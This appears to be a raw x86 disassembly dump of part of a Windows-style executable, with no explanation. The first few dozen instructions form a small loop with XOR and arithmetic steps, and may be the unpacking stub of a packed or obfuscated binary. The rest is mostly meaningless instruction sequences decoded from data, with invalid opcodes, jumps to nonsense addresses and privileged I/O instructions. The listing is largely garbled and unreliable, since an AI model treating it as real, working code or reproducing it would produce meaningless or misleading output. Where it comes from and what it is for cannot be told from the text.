  4038f6:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  4038fd:	movzx  eax,WORD PTR ds:0x42a010
  403904:	adc    eax,DWORD PTR ds:0x42a000
  40390a:	mov    ds:0x42a010,eax
  40390f:	mov    eax,DWORD PTR [ebp-0x28]
  403912:	mov    DWORD PTR ds:0x42a01c,0x1c
  40391c:	cmp    DWORD PTR ds:0x42a01c,0x0
  403923:	je     0x403973
  403929:	cmp    DWORD PTR ds:0x42a01c,0xa
  403930:	jg     0x403973
  403936:	jmp    0x403947
  40393b:	push   DWORD PTR [ebp-0x18]
  40393e:	push   DWORD PTR [ebp-0x24]
  403941:	call   DWORD PTR ds:0x430037
  403947:	cmp    DWORD PTR ds:0x42a01c,0xb
  40394e:	jne    0x403961
  403954:	mov    ecx,DWORD PTR ds:0x42a01c
  40395a:	dec    ecx
  40395b:	mov    DWORD PTR ds:0x42a01c,ecx
  403961:	mov    ecx,DWORD PTR ds:0x42a01c
  403967:	dec    ecx
  403968:	mov    DWORD PTR ds:0x42a01c,ecx
  40396e:	jmp    0x40391c
  403973:	mov    ecx,DWORD PTR [ebp-0x18]
  403976:	xor    eax,esi
  403978:	xor    ecx,esi
  40397a:	add    eax,edi
  40397c:	sbb    DWORD PTR ds:0x42b018,0x7aac
  403986:	add    ecx,edi
  403988:	mov    BYTE PTR [ebp-0x21],dl
  40398b:	cmp    eax,ecx
  40398d:	jae    0x405e2d
  403993:	and    edx,DWORD PTR ds:0x42b010
  403999:	lea    ecx,[eax-0x3272ec]
  40399f:	xor    edx,0x10ed
  4039a5:	jmp    0x405d01
  4039aa:	sub    DWORD PTR [esi+0x66],ebp
  4039ad:	std    
  4039ae:	sbb    ebp,esi
  4039b0:	cdq    
  4039b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039b2:	cld    
  4039b3:	ss scas al,BYTE PTR es:[edi]
  4039b5:	sub    ecx,DWORD PTR [ebx+0x3b2e31b5]
  4039bb:	pop    edi
  4039bc:	jp     0x403a38
  4039be:	cmp    ebx,DWORD PTR [edi+0x7a]
  4039c1:	jp     0x403991
  4039c3:	mov    edi,0xc23158e1
  4039c8:	or     bh,0xc7
  4039cb:	fld    DWORD PTR [eax-0x41c02144]
  4039d1:	and    DWORD PTR [edx-0x5d],ebp
  4039d4:	dec    edx
  4039d5:	push   cs
  4039d6:	inc    ebp
  4039d7:	mov    bh,0xd3
  4039d9:	(bad)  
  4039da:	and    BYTE PTR [eax-0x61b794a5],bl
  4039e0:	test   BYTE PTR [edi+0x29],dh
  4039e3:	fimul  WORD PTR [ecx]
  4039e5:	adc    BYTE PTR [ecx+0x19a0b72],bh
  4039eb:	shl    DWORD PTR [ebp+0x1b],1
  4039ee:	mov    bl,0x7b
  4039f0:	pop    edi
  4039f1:	enter  0xd4f1,0x73
  4039f5:	mov    BYTE PTR [esi+0x46eb123d],dl
  4039fb:	push   edx
  4039fc:	and    BYTE PTR [eax-0x2a7d6aea],al
  403a02:	test   edx,0x7f0856c6
  403a08:	mov    cl,0xae
  403a0a:	jnp    0x4039f9
  403a0c:	in     eax,dx
  403a0d:	add    BYTE PTR [ecx+0x354a2cdc],dl
  403a13:	mov    bl,0x8
  403a15:	in     eax,0x1c
  403a17:	add    dl,BYTE PTR [edi]
  403a19:	test   BYTE PTR [esi-0x58923918],cl
  403a1f:	sub    eax,0x194306e4
  403a24:	jmp    0xe962:0x76c8f1a8
  403a2b:	retf   
  403a2c:	xchg   esi,eax
  403a2d:	and    BYTE PTR [edx+eiz*4-0xe],bh
  403a31:	xchg   esp,eax
  403a32:	cmp    al,0x64
  403a34:	mov    BYTE PTR [edi],cl
  403a36:	in     al,dx
  403a37:	sbb    DWORD PTR [esi+esi*4-0x7f],ebx
  403a3b:	push   esi
  403a3c:	or     bl,BYTE PTR ds:0xd7236f76
  403a42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a43:	jg     0x403a99
  403a45:	ds (bad) 
  403a47:	gs ins BYTE PTR es:[edi],dx
  403a49:	xchg   esp,eax
  403a4a:	mov    ah,0x81
  403a4c:	cs pop esp
  403a4e:	mov    al,0x6b
  403a50:	push   es
  403a51:	addr16 mov bl,0xbc
  403a54:	cs jb  0x403a32
  403a57:	aad    0x9d
  403a59:	pop    DWORD PTR [ecx+0x5]
  403a5c:	push   0x2e
  403a5e:	push   eax
  403a5f:	push   0xffffffb8
  403a61:	and    esp,DWORD PTR [eax-0x7c199ed0]
  403a67:	out    dx,eax
  403a68:	loop   0x4039fb
  403a6a:	dec    dh
  403a6c:	mov    esi,0x5d34ebf8
  403a71:	add    eax,0x5c293476
  403a76:	mov    dh,BYTE PTR [ecx]
  403a78:	pop    ebp
  403a79:	jnp    0x403a6c
  403a7b:	push   eax
  403a7c:	mov    edi,0xcef0931f
  403a81:	in     al,0xc4
  403a83:	mov    ecx,0xfc395b23
  403a88:	jo     0x403aaa
  403a8a:	dec    edi
  403a8b:	xchg   DWORD PTR [ebp-0x44ec9e51],edi
  403a91:	loope  0x403a73
  403a93:	pop    edi
  403a94:	daa    
  403a95:	aad    0x7d
  403a97:	xchg   ebp,eax
  403a98:	sahf   
  403a99:	push   ss
  403a9a:	cmp    esp,0x1f9d1016
  403aa0:	jmp    0x403b19
  403aa2:	rol    BYTE PTR [edi-0x6f],cl
  403aa5:	pop    es
  403aa6:	xchg   ebp,eax
  403aa7:	push   es
  403aa8:	imul   ebx,esi,0xffffffad
  403aab:	gs or  bh,bh
  403aae:	imul   esi,DWORD PTR ds:0x18ed2414,0x30
  403ab5:	inc    edx
  403ab6:	es pop edi
  403ab8:	push   ss
  403ab9:	lock add ah,cl
  403abc:	loop   0x403b1b
  403abe:	aad    0xe2
  403ac0:	into   
  403ac1:	xor    eax,esp
  403ac3:	(bad)  
  403ac4:	ins    BYTE PTR es:[edi],dx
  403ac5:	jle    0x403b06
  403ac7:	sbb    DWORD PTR [ecx],edx
  403ac9:	xchg   esi,eax
  403aca:	xchg   BYTE PTR [ebx+0x10],bh
  403acd:	and    BYTE PTR [esi+0x1],al
  403ad0:	and    BYTE PTR [ecx],dl
  403ad2:	mov    BYTE PTR [ecx+edx*8],dl
  403ad5:	jge    0x403b1d
  403ad7:	lods   al,BYTE PTR ds:[esi]
  403ad8:	cwde   
  403ad9:	out    0x26,al
  403adb:	mov    ebp,0x80c4f1d9
  403ae0:	sbb    cl,BYTE PTR [edx+edx*8+0x3321acdb]
  403ae7:	vpsubw ymm4,ymm2,ymm5
  403aeb:	sti    
  403aec:	push   eax
  403aed:	leave  
  403aee:	xchg   ebx,eax
  403aef:	jg     0x403a8c
  403af1:	dec    ebp
  403af2:	push   edx
  403af3:	(bad)  
  403af4:	lock xor eax,0x627d7eb0
  403afa:	xchg   BYTE PTR [ebp-0x20e82c4a],bh
  403b00:	jmp    0xd3fbdb25
  403b05:	outs   dx,DWORD PTR ds:[esi]
  403b06:	mov    al,ds:0x5fb9f6e0
  403b0b:	bound  eax,QWORD PTR [esi]
  403b0d:	stc    
  403b0e:	mov    ah,0x93
  403b10:	push   edx
  403b11:	mov    eax,0x98287c50
  403b16:	outs   dx,DWORD PTR ds:[esi]
  403b17:	aas    
  403b18:	stos   BYTE PTR es:[edi],al
  403b19:	or     BYTE PTR [ecx+0x271041f6],ah
  403b1f:	int    0xc0
  403b21:	ds push ds
  403b23:	adc    eax,0x45dbce5a
  403b28:	(bad)  
  403b2a:	dec    ecx
  403b2b:	dec    eax
  403b2c:	and    ecx,ebx
  403b2e:	test   ah,cl
  403b30:	nop
  403b31:	retf   
  403b32:	out    0x6f,al
  403b34:	mov    cl,0x1e
  403b36:	xchg   esi,eax
  403b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b38:	shr    DWORD PTR [ebx+ecx*2],cl
  403b3b:	loope  0x403b86
  403b3d:	stos   DWORD PTR es:[edi],eax
  403b3e:	(bad)  
  403b40:	imul   esi,eax,0xffffffd1
  403b43:	out    0x3f,al
  403b45:	push   ecx
  403b46:	call   0xbc1e76a4
  403b4b:	sbb    al,0x81
  403b4d:	mov    esi,0xd5214d8a
  403b52:	mov    edi,DWORD PTR [ecx-0x68]
  403b55:	jns    0x403b30
  403b57:	sub    eax,0x78aeb72f
  403b5c:	pusha  
  403b5d:	into   
  403b5e:	repz mov cl,BYTE PTR [edx]
  403b61:	xor    al,0x40
  403b63:	xor    eax,0xa7472d3
  403b68:	imul   edi,DWORD PTR [edi],0xdc468099
  403b6e:	xor    eax,0x5ffed513
  403b73:	mov    ebx,0x73db243e
  403b78:	mov    fs,edi
  403b7a:	stc    
  403b7b:	pushf  
  403b7c:	enter  0x1d32,0x65
  403b80:	cmp    bh,bh
  403b82:	test   BYTE PTR [edi+0x59],bh
  403b85:	jg     0x403b08
  403b87:	jb     0x403bcd
  403b89:	jnp    0x403b5b
  403b8b:	push   cs
  403b8c:	adc    al,0x23
  403b8e:	mov    bh,0x3b
  403b90:	nop
  403b91:	and    ebp,DWORD PTR [ebx+0x3f67c3f3]
  403b97:	call   0xbba038e1
  403b9c:	out    dx,eax
  403b9d:	ins    DWORD PTR es:[edi],dx
  403b9e:	sub    esi,0xc00553ef
  403ba4:	ss mov eax,0x88d47db1
  403baa:	cmp    BYTE PTR [edx-0x2f664909],ch
  403bb0:	es std 
  403bb2:	or     eax,0x93c77d05
  403bb7:	in     eax,dx
  403bb8:	sahf   
  403bb9:	dec    eax
  403bba:	cmp    BYTE PTR ds:0x7de98999,al
  403bc0:	inc    eax
  403bc1:	ficomp WORD PTR [ebp-0x2f3c2142]
  403bc8:	mov    fs,WORD PTR [eax+0x4bcbbc15]
  403bce:	sub    esp,0x7a34a608
  403bd4:	inc    ecx
  403bd5:	fs je  0x403b81
  403bd8:	sbb    ah,BYTE PTR [ecx]
  403bda:	sub    al,0xda
  403bdc:	arpl   WORD PTR [eax],sp
  403bde:	adc    DWORD PTR [eax+0x43],edx
  403be1:	dec    edx
  403be2:	not    DWORD PTR [ecx]
  403be4:	jmp    0x7adc:0xf80543a3
  403beb:	loopne 0x403c6b
  403bed:	mov    bl,0xd4
  403bef:	push   ss
  403bf0:	(bad)  
  403bf1:	ss mov bl,0xec
  403bf4:	push   0xcff1b2a6
  403bf9:	xchg   esi,eax
  403bfa:	or     DWORD PTR [ebx],edi
  403bfc:	xor    al,0x13
  403bfe:	xor    al,0x30
  403c00:	stos   DWORD PTR es:[edi],eax
  403c01:	jmp    0x7e75:0x94ed6f70
  403c08:	call   0xb69c:0x5b2f8156
  403c0f:	mov    ebp,0xc3ff3fac
  403c14:	or     al,0xa1
  403c16:	mov    edi,0x146b688
  403c1b:	js     0x403c52
  403c1d:	jp     0x403c35
  403c1f:	mov    dl,0x49
  403c21:	(bad)  
  403c22:	fild   DWORD PTR [ebx-0xd3f4b46]
  403c28:	and    eax,0xc089a1b8
  403c2d:	popa   
  403c2e:	push   esi
  403c2f:	fisubr WORD PTR [edi-0xc]
  403c32:	push   ss
  403c33:	pop    edi
  403c34:	enter  0xa523,0xed
  403c38:	sti    
  403c39:	and    al,0xc9
  403c3b:	jl     0x403c8d
  403c3d:	(bad)  [edx-0x32]
  403c40:	and    dl,BYTE PTR [esi-0xb]
  403c43:	mov    al,0x5e
  403c45:	sub    eax,0xd138c45a
  403c4a:	mov    dh,0x28
  403c4c:	add    eax,0xc2262155
  403c51:	add    al,0xe2
  403c53:	out    dx,eax
  403c54:	in     al,0x5a
  403c56:	or     al,0xfe
  403c58:	add    ch,BYTE PTR gs:[ecx+0x21]
  403c5c:	sub    esi,DWORD PTR [eax-0x30cfb1c2]
  403c62:	mov    edi,fs
  403c64:	sub    ebx,esp
  403c66:	jae    0x403c49
  403c68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c69:	fdiv   DWORD PTR [ecx]
  403c6b:	cmp    BYTE PTR [ecx],al
  403c6d:	(bad)  
  403c6e:	in     al,0xb3
  403c70:	cli    
  403c71:	test   al,0x5c
  403c73:	pop    edx
  403c74:	jno    0x403c60
  403c76:	sub    DWORD PTR gs:[ecx],0xaa766097
  403c7d:	neg    DWORD PTR [edi]
  403c7f:	ror    BYTE PTR cs:[edx+0xd],0x3d
  403c84:	jecxz  0x403c1f
  403c86:	sub    DWORD PTR [eax+esi*4-0x9],edi
  403c8a:	test   eax,0x1201a71b
  403c90:	dec    ebx
  403c91:	adc    al,cl
  403c93:	shl    BYTE PTR [eax-0x44],0xa0
  403c97:	push   ds
  403c98:	(bad)  
  403c99:	xor    DWORD PTR [ecx],edi
  403c9b:	adc    DWORD PTR [ecx-0x67],edi
  403c9e:	lea    ebp,[ecx]
  403ca0:	push   cs
  403ca1:	fistp  WORD PTR [esi+0x5daa0611]
  403ca7:	out    dx,eax
  403ca8:	jae    0x403c9c
  403caa:	pop    es
  403cab:	in     al,0xd6
  403cad:	sbb    ecx,DWORD PTR [eax+0x3]
  403cb0:	fs jnp 0x403cd5
  403cb3:	sub    dl,BYTE PTR [ecx]
  403cb5:	pop    es
  403cb6:	push   DWORD PTR [ebp-0x5077f5c0]
  403cbc:	clc    
  403cbd:	cmp    ah,BYTE PTR [edx]
  403cbf:	scas   al,BYTE PTR es:[edi]
  403cc0:	xchg   esp,eax
  403cc1:	push   esp
  403cc2:	mov    BYTE PTR [edi],dl
  403cc4:	push   0xfa781a3
  403cc9:	dec    esi
  403cca:	dec    ecx
  403ccb:	jns    0x403ce6
  403ccd:	jo     0x403d31
  403ccf:	xchg   esp,eax
  403cd0:	cmp    BYTE PTR [ebx-0x3083cf85],cl
  403cd6:	sbb    esp,edx
  403cd8:	sysexit 
  403cda:	push   0xa7625884
  403cdf:	div    DWORD PTR [ecx]
  403ce1:	scas   al,BYTE PTR es:[edi]
  403ce2:	xchg   DWORD PTR [ebp+ecx*1-0x7aea5c2f],edx
  403ce9:	fcomp  DWORD PTR [esi-0x11]
  403cec:	mov    BYTE PTR [ecx-0x4b],ch
  403cef:	dec    esi
  403cf0:	sub    ch,BYTE PTR [ecx-0x7d5e3825]
  403cf6:	fcmovnb st,st(4)
  403cf8:	or     BYTE PTR [esi-0x51],0x73
  403cfc:	ror    BYTE PTR [ecx],0x76
  403cff:	xchg   BYTE PTR [ecx],ah
  403d01:	mov    bl,0xac
  403d03:	repnz sbb ebx,esi
  403d06:	sbb    eax,0x1f748daf
  403d0b:	cmp    eax,DWORD PTR [esi]
  403d0d:	ret    
  403d0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d0f:	outs   dx,DWORD PTR ds:[esi]
  403d10:	into   
  403d11:	jo     0x403c94
  403d13:	test   al,0xbd
  403d15:	dec    ebx
  403d16:	mov    ah,0xc8
  403d18:	and    dl,bh
  403d1a:	(bad)  
  403d1b:	sub    BYTE PTR [ebx-0x60147e3d],ah
  403d21:	or     eax,0x9f725347
  403d26:	in     al,0xdf
  403d28:	inc    edx
  403d29:	push   es
  403d2a:	mov    bl,0x7e
  403d2c:	retf   
  403d2d:	dec    edx
  403d2e:	mov    ch,0xf
  403d30:	push   0xffffffc9
  403d32:	imul   esp,edi,0x80a3df1
  403d38:	sbb    ch,dl
  403d3a:	adc    DWORD PTR [ebp-0x13],edi
  403d3d:	xor    al,0x3f
  403d3f:	repz das 
  403d41:	jb     0x403d27
  403d43:	aad    0x3f
  403d45:	daa    
  403d46:	pusha  
  403d47:	std    
  403d48:	cwde   
  403d49:	sub    al,0x9
  403d4b:	xor    eax,0x4659a27d
  403d50:	mov    ah,0x1e
  403d52:	mov    bl,0x59
  403d54:	ret    0x6e37
  403d57:	into   
  403d58:	and    ebp,ebx
  403d5a:	jne    0x403d83
  403d5c:	aaa    
  403d5d:	push   ds
  403d5e:	or     DWORD PTR [ebx+0x72227ab3],ecx
  403d64:	sbb    eax,0xc6a18126
  403d69:	push   es
  403d6a:	in     al,dx
  403d6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d6c:	imul   BYTE PTR fs:[edx+esi*4+0x6a9943d0]
  403d74:	es xchg esp,eax
  403d76:	jb     0x403d70
  403d78:	popa   
  403d79:	aad    0xf
  403d7b:	sbb    DWORD PTR [edi+ecx*8-0x190060b3],eax
  403d82:	in     eax,0x52
  403d84:	outs   dx,DWORD PTR ds:[esi]
  403d85:	jmp    DWORD PTR [edx+ebx*1+0x2a]
  403d89:	in     al,dx
  403d8a:	jb     0x403d81
  403d8c:	xor    eax,0xf541e349
  403d91:	ja     0x403d5f
  403d93:	aad    0xa5
  403d95:	cmp    eax,DWORD PTR [ebx-0x524b18f4]
  403d9b:	push   ss
  403d9c:	adc    al,0x53
  403d9e:	test   DWORD PTR [ecx+0x5670d718],esi
  403da4:	popa   
  403da5:	mov    edi,0x272790fb
  403daa:	into   
  403dab:	dec    ebx
  403dac:	pop    es
  403dad:	ret    
  403dae:	ds loope 0x403da7
  403db1:	pop    ds
  403db2:	(bad)  
  403db3:	int3   
  403db4:	mov    ch,BYTE PTR [ebx+0x64533026]
  403dba:	mov    esp,0xa510fb96
  403dbf:	pop    ds
  403dc0:	cmp    DWORD PTR [ecx-0x6e],esi
  403dc3:	inc    ebx
  403dc4:	out    0x5f,eax
  403dc6:	in     al,dx
  403dc7:	mov    BYTE PTR ds:0x1781823,ah
  403dcd:	dec    ebx
  403dce:	popf   
  403dcf:	jbe    0x403db3
  403dd1:	inc    edi
  403dd2:	mov    edx,0xe77078c5
  403dd7:	xor    al,0xfd
  403dd9:	inc    ebp
  403dda:	lea    eax,ds:0x878ea12e
  403de0:	sti    
  403de1:	les    eax,FWORD PTR [ebp+0x96a6237]
  403de7:	cmp    eax,0x5638c649
  403dec:	push   ds
  403ded:	dec    edi
  403dee:	fisubr DWORD PTR [eax+0x49]
  403df1:	scas   al,BYTE PTR es:[edi]
  403df2:	jno    0x403e38
  403df4:	jle    0x403dcc
  403df6:	fwait
  403df7:	mov    bh,0x37
  403df9:	dec    edx
  403dfa:	push   eax
  403dfb:	push   ss
  403dfc:	add    edx,esp
  403dfe:	rcl    BYTE PTR [ecx],0x3c
  403e01:	nop
  403e02:	leave  
  403e03:	add    BYTE PTR [eax-0x4e7bbe8e],dl
  403e09:	dec    edx
  403e0a:	adc    BYTE PTR [ebp-0x4b],0xf0
  403e0e:	push   ss
  403e0f:	mov    esi,0x4d38f0d8
  403e14:	xor    al,BYTE PTR [edi+0x29ee824c]
  403e1a:	das    
  403e1b:	cmp    ecx,edi
  403e1d:	hlt    
  403e1e:	push   ebx
  403e1f:	mov    es,esp
  403e21:	(bad)  
  403e23:	mov    ds:0x8083a400,al
  403e28:	imul   ebp,DWORD PTR ss:[ecx-0x3d86adbd],0x51
  403e30:	and    ebp,ebx
  403e32:	cli    
  403e33:	mov    cl,0xaf
  403e35:	(bad)  
  403e36:	mov    esi,0x4d83f3a9
  403e3b:	cmp    eax,0x673a54b7
  403e40:	jl     0x403e04
  403e42:	push   ecx
  403e43:	test   ax,0x57e8
  403e47:	xor    DWORD PTR [eax-0x1244ac88],ebx
  403e4d:	jns    0x403df8
  403e4f:	inc    ebp
  403e50:	jns    0x403e65
  403e52:	les    esp,FWORD PTR [esi+eiz*8-0x49]
  403e56:	sub    eax,0x8ff62296
  403e5b:	test   BYTE PTR [eax],ch
  403e5d:	sub    BYTE PTR [edi],bl
  403e5f:	jmp    0x2fcd9d6
  403e64:	mov    bl,0x2e
  403e66:	scas   al,BYTE PTR es:[edi]
  403e67:	add    al,BYTE PTR [ebx+edi*1-0x280a9372]
  403e6e:	rcr    DWORD PTR [ebx+0x5b],0x62
  403e72:	shr    DWORD PTR [edi-0x3a2afb35],cl
  403e78:	cmp    DWORD PTR [ecx+0x39cdbc0b],eax
  403e7e:	xor    eax,0xd5c6d345
  403e83:	adc    esp,DWORD PTR [ebx]
  403e85:	mov    DWORD PTR [edi-0x43f546a5],edx
  403e8b:	test   BYTE PTR [eax],ch
  403e8d:	fldenv [ebp+0x12]
  403e90:	ds pop ebp
  403e92:	mov    dh,BYTE PTR [edx]
  403e94:	ins    BYTE PTR es:[edi],dx
  403e95:	icebp  
  403e96:	add    ah,bl
  403e98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e99:	mov    bh,0xb4
  403e9b:	fidiv  WORD PTR [edx]
  403e9d:	xchg   ebx,eax
  403e9e:	imul   eax,DWORD PTR [ebx],0x5ceb9562
  403ea4:	cwde   
  403ea5:	(bad)  
  403ea6:	(bad)  
  403ea7:	ins    DWORD PTR es:[edi],dx
  403ea8:	pop    ds
  403ea9:	sahf   
  403eaa:	pop    es
  403eab:	push   cs
  403eac:	add    al,0xf8
  403eae:	and    esi,DWORD PTR [ebp+0x6fd5c19c]
  403eb4:	pusha  
  403eb5:	bound  ebx,QWORD PTR [ebx+0x6196a20d]
  403ebb:	fistp  WORD PTR [ebx-0x5f]
  403ebe:	dec    ecx
  403ebf:	xchg   ebx,eax
  403ec0:	test   DWORD PTR [eax],esp
  403ec2:	loopne 0x403edd
  403ec4:	jae    0x403ebd
  403ec6:	call   0xb878:0x5b8ea28d
  403ecd:	mov    esi,0x769af421
  403ed2:	je     0x403e56
  403ed4:	das    
  403ed5:	pop    edi
  403ed6:	and    cl,BYTE PTR [edi-0x1998b7fa]
  403edc:	jmp    FWORD PTR [ebp-0x56]
  403edf:	punpckhdq mm2,mm6
  403ee2:	out    0x8f,eax
  403ee4:	xor    BYTE PTR [ebp+0x1c],cl
  403ee7:	inc    eax
  403ee8:	xchg   ebx,eax
  403ee9:	gs retf 0x40d9
  403eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403eee:	js     0x403e8b
  403ef0:	sti    
  403ef1:	sub    bl,BYTE PTR [edi-0x401c0520]
  403ef7:	loopne 0x403f5f
  403ef9:	scas   al,BYTE PTR es:[edi]
  403efa:	jbe    0x403eb0
  403efc:	fs ret 
  403efe:	and    DWORD PTR [ebx-0x7cd5f933],ebx
  403f04:	icebp  
  403f05:	leave  
  403f06:	(bad)  
  403f07:	cmp    esp,DWORD PTR [ebx-0x6d2c3d3b]
  403f0d:	cmp    DWORD PTR [ebx+0x3f],ebx
  403f10:	and    al,0x4b
  403f12:	call   0x18a8:0x2dea1129
  403f19:	xlat   BYTE PTR ds:[ebx]
  403f1a:	cmp    ebx,DWORD PTR [ebp+0x72]
  403f1d:	adc    DWORD PTR [ecx+0x6dd96b16],0x5045db32
  403f27:	mov    ebp,0x250f17e8
  403f2c:	dec    ecx
  403f2d:	mov    edx,0x42caed0b
  403f32:	inc    DWORD PTR [eax-0xa908c0f]
  403f38:	xor    BYTE PTR [ebx],al
  403f3a:	and    DWORD PTR [edx-0x29],esi
  403f3d:	call   0x471cdcec
  403f42:	aas    
  403f43:	push   0xa3e0f08a
  403f48:	pop    edi
  403f49:	int    0x49
  403f4b:	inc    edx
  403f4c:	xchg   DWORD PTR [ebx+ebp*8],ebp
  403f4f:	inc    ebx
  403f50:	ins    DWORD PTR es:[edi],dx
  403f51:	pop    edi
  403f52:	retf   0xd432
  403f55:	push   edi
  403f56:	outs   dx,BYTE PTR ds:[esi]
  403f57:	nop
  403f58:	push   edi
  403f59:	(bad)  
  403f5a:	std    
  403f5b:	lock inc ecx
  403f5d:	push   0x3d
  403f5f:	in     al,dx
  403f60:	pop    eax
  403f61:	mov    cl,BYTE PTR [edi]
  403f63:	or     bl,BYTE PTR [edi]
  403f65:	call   0xcf64:0x3025e27e
  403f6c:	add    eax,0xc668141f
  403f71:	jge    0x403f07
  403f73:	adc    eax,0x8514ea4d
  403f78:	rcl    BYTE PTR [esi+0x27],0xa
  403f7c:	dec    ebp
  403f7d:	or     ch,al
  403f7f:	push   es
  403f80:	jmp    0x786230d0
  403f85:	adc    eax,0x27a386c4
  403f8a:	mov    ah,0x2e
  403f8c:	push   ecx
  403f8d:	sbb    eax,0xbecd9bb3
  403f93:	and    DWORD PTR [ebx+0x3b00ef1b],0x300e8d7f
  403f9d:	lea    edi,[ebx]
  403f9f:	test   DWORD PTR [edx+eax*2],ecx
  403fa2:	clc    
  403fa3:	push   es
  403fa4:	btr    DWORD PTR [edi-0x2b],eax
  403fa8:	add    al,0x86
  403faa:	mov    esi,DWORD PTR [ecx]
  403fac:	repz sbb bh,BYTE PTR [eax+0x212a4338]
  403fb3:	test   DWORD PTR [esi+0x16],ebx
  403fb6:	inc    esi
  403fb7:	fwait
  403fb8:	enter  0x1c9a,0x2b
  403fbc:	mov    DWORD PTR [eax-0x1f],ebp
  403fbf:	adc    cl,BYTE PTR [edx+0x2f]
  403fc2:	sbb    eax,0x1132b07e
  403fc7:	fcomp  st(2)
  403fc9:	sbb    esi,DWORD PTR [edi+esi*1-0x6]
  403fcd:	into   
  403fce:	(bad)  [edx+ebx*8]
  403fd1:	in     eax,dx
  403fd2:	mov    esi,ebp
  403fd4:	test   DWORD PTR [edx-0x5e],edx
  403fd7:	fiadd  WORD PTR [edx+0x27]
  403fda:	mov    ah,0xc0
  403fdc:	add    DWORD PTR [ebx+0x2d5ce689],esi
  403fe2:	adc    eax,0x55a8b5c1
  403fe7:	sub    al,0x35
  403fe9:	push   esi
  403fea:	es mov dh,0x15
  403fed:	mov    DWORD PTR [eax-0x8066755],edi
  403ff3:	sbb    ecx,DWORD PTR [eax+0x2f]
  403ff6:	inc    ecx
  403ff7:	popf   
  403ff8:	inc    edi
  403ff9:	push   ds
  403ffa:	shl    BYTE PTR ds:0xb574bb60,cl
  404000:	dec    ecx
  404001:	or     al,BYTE PTR ds:0x73e4e282
  404007:	test   BYTE PTR [ebp-0x6e],ch
  40400a:	mov    BYTE PTR [ebx+ebp*2],dh
  40400d:	leave  
  40400e:	(bad)  
  40400f:	jp     0x404062
  404011:	retf   0x2d75
  404014:	sahf   
  404015:	sti    
  404016:	jl     0x404084
  404018:	dec    edx
  404019:	add    al,BYTE PTR [esi+0x50]
  40401c:	call   0xa6f9:0x44be8bed
  404023:	push   ebx
  404024:	pop    ecx
  404025:	cdq    
  404026:	popf   
  404027:	mov    WORD PTR [ebp-0x6e846b1c],gs
  40402d:	fmul   DWORD PTR ds:0x224749a9
  404033:	pop    ds
  404034:	das    
  404035:	mov    ecx,0xa22974ce
  40403a:	push   eax
  40403b:	cmp    cl,bl
  40403d:	fwait
  40403e:	retf   0x4ebe
  404041:	mov    ebp,0x17a5fd2e
  404046:	dec    esp
  404047:	jle    0x404033
  404049:	test   DWORD PTR [eax-0x70],0xe67b5d68
  404050:	pop    eax
  404051:	imul   ebp,DWORD PTR [ecx],0x7c296a27
  404057:	lds    esp,FWORD PTR [ebx+0x6c41d647]
  40405d:	popf   
  40405e:	sub    al,0x9f
  404060:	sub    DWORD PTR [edx-0x7d],ebp
  404063:	cmp    al,0x8b
  404065:	scas   eax,DWORD PTR es:[edi]
  404066:	repnz test ecx,ebx
  404069:	test   DWORD PTR ds:0xc50279ca,edi
  40406f:	arpl   WORD PTR [edi+ebx*1+0x291f4ca0],bx
  404076:	pusha  
  404077:	leave  
  404078:	push   ebx
  404079:	add    dl,BYTE PTR es:[ebx+0x576de96f]
  404080:	test   eax,0x6702befc
  404085:	sub    dl,ah
  404087:	retf   0x9e4c
  40408a:	or     cl,BYTE PTR [edx+0x4a489f84]
  404090:	or     DWORD PTR [edi+ecx*4],eax
  404093:	stos   DWORD PTR es:[edi],eax
  404094:	jmp    0xd78f:0x265648d1
  40409b:	into   
  40409c:	add    dh,BYTE PTR [edi]
  40409e:	imul   edi,DWORD PTR [ecx],0xf1c88ecd
  4040a4:	jg     0x404054
  4040a6:	loopne 0x404085
  4040a8:	push   edi
  4040a9:	jmp    0x46bd:0x9bb0e886
  4040b0:	out    dx,al
  4040b1:	fcmove st,st(7)
  4040b3:	fwait
  4040b4:	ins    BYTE PTR es:[edi],dx
  4040b5:	dec    ebx
  4040b6:	sar    DWORD PTR [ecx],0x54
  4040b9:	dec    BYTE PTR [edx-0x14]
  4040bc:	mov    esp,0xd1cd249d
  4040c1:	das    
  4040c2:	pop    ss
  4040c3:	ins    BYTE PTR es:[edi],dx
  4040c4:	xor    DWORD PTR [ecx+0x4aeba75d],edx
  4040ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040cb:	push   ebx
  4040cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040cd:	and    ecx,ebx
  4040cf:	cs and al,0x5e
  4040d2:	rcl    eax,0x91
  4040d5:	adc    eax,0xfa0343a5
  4040da:	xor    eax,0xbe35dda9
  4040df:	in     eax,dx
  4040e0:	push   ebx
  4040e1:	mov    dh,0x1
  4040e3:	dec    ecx
  4040e4:	in     al,0xb1
  4040e6:	popa   
  4040e7:	cmp    ch,BYTE PTR [eax+0x1ad012c]
  4040ed:	pop    eax
  4040ee:	mov    DWORD PTR [ebx],edx
  4040f0:	loopne 0x4040a3
  4040f2:	cmp    DWORD PTR [ecx+0x7],0x59
  4040f6:	test   al,0x1
  4040f8:	add    esi,DWORD PTR [esi+0x6d]
  4040fb:	stos   BYTE PTR es:[edi],al
  4040fc:	les    eax,FWORD PTR [esi-0x54c3fd75]
  404102:	push   ebx
  404103:	sub    cl,dh
  404105:	mov    DWORD PTR [edi-0x53dd0c03],ebx
  40410b:	js     0x4040c0
  40410d:	sub    dh,al
  40410f:	inc    esi
  404110:	stos   DWORD PTR es:[edi],eax
  404111:	fiadd  WORD PTR [eax+0x51f1292f]
  404117:	arpl   bx,sp
  404119:	dec    esi
  40411a:	dec    ecx
  40411b:	cmp    eax,0x6f07b6d7
  404120:	jl     0x40410a
  404122:	test   esp,edx
  404124:	xor    dh,0xde
  404127:	pop    esi
  404128:	and    al,0x34
  40412a:	push   ecx
  40412b:	in     eax,0xca
  40412d:	inc    ecx
  40412e:	lea    ecx,[ebx+0x53877270]
  404134:	dec    ecx
